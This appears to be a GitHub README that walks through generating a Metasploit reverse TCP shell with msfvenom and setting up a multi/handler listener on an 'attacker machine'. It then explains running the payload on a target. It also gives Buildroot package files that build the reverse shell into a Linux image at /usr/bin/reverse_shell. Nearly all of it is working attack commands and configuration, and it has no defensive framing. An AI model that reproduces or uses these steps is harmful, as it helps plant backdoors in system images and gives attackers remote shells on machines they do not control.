# Cybersecurity-Custom-Payload
This is a custom Payload that compiled for Linux arch x86-64 by using Metasploit and added to the Linux image by Buildroot

# Steps to Use linux/x64/shell_reverse_tcp with msfvenom:
Generate the Payload: You can generate the payload using msfvenom by specifying the target architecture and other parameters like the listener's IP (LHOST) and port (LPORT).

Example command:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o reverse_shell.elf

Here:
-p linux/x64/shell_reverse_tcp: Specifies the payload (reverse TCP shell for 64-bit Linux).
LHOST=192.168.1.100: Set this to the IP address of your attacker's machine (the machine that will receive the reverse connection).
LPORT=4444: Set this to the port on which the attacker’s machine will listen for the reverse shell.
-f elf: Specifies the output format as ELF (Executable and Linkable Format) for Linux.
-o reverse_shell.elf: The output file name where the payload will be saved.

Set Up the Listener on Your Attacker Machine: On your attacker machine (e.g., Kali Linux), use Metasploit's multi/handler to listen for the incoming reverse shell.
msfconsole
use multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run

Transfer and Execute the Payload: Transfer the generated reverse_shell.elf to the target machine and execute it. Once the payload is executed on the target, it will attempt to connect back to the attacker's machine at the specified LHOST and LPORT.

Gain Access: Once the connection is established, the attacker will get a command shell from the target machine.

Compatibility:
Target Machine: The payload linux/x64/shell_reverse_tcp is specifically for 64-bit Linux systems. Ensure the target machine is running a 64-bit Linux system (x86-64 architecture).
----------------------------------------------------------------------------------
# Buildroot steps:
#create the custom package:
1- create custom_payload folder

2- create Config.in file:
	config BR2_PACKAGE_CUSTOM_PAYLOAD
    bool "Custom Payload"
    help
      This package installs a custom payload (reverse_shell.elf) into the target root filesystem.

3- create custom_payload.mk file	
	################################################################################
	# Custom Payload Package
	################################################################################
	
	# Define a custom variable for your project directory
	MY_PROJECT_DIR = /home/ahmed/Desktop/OneKey/buildroot-2024.08.2
	
	CUSTOM_PAYLOAD_VERSION = 1.0
	CUSTOM_PAYLOAD_SITE = $(MY_PROJECT_DIR)/package/custom_payload
	CUSTOM_PAYLOAD_SITE_METHOD = local
	CUSTOM_PAYLOAD_LICENSE = Proprietary
	CUSTOM_PAYLOAD_LICENSE_FILES =
	
	define CUSTOM_PAYLOAD_INSTALL_TARGET_CMDS
		$(INSTALL) -D -m 0755 $(CUSTOM_PAYLOAD_SITE)/reverse_shell.elf \
			$(TARGET_DIR)/usr/bin/reverse_shell
	endef
	
	$(eval $(generic-package))
	
4- add the reverse_shell.elf to the custom_payload folder

5- add the custom Config.in to the main Config.in :
	#custom payload
	source "package/custom_payload/Config.in"
	
6- check the custom payload in menuconfig:
	make menuconfig
	
7- build your image:
	make
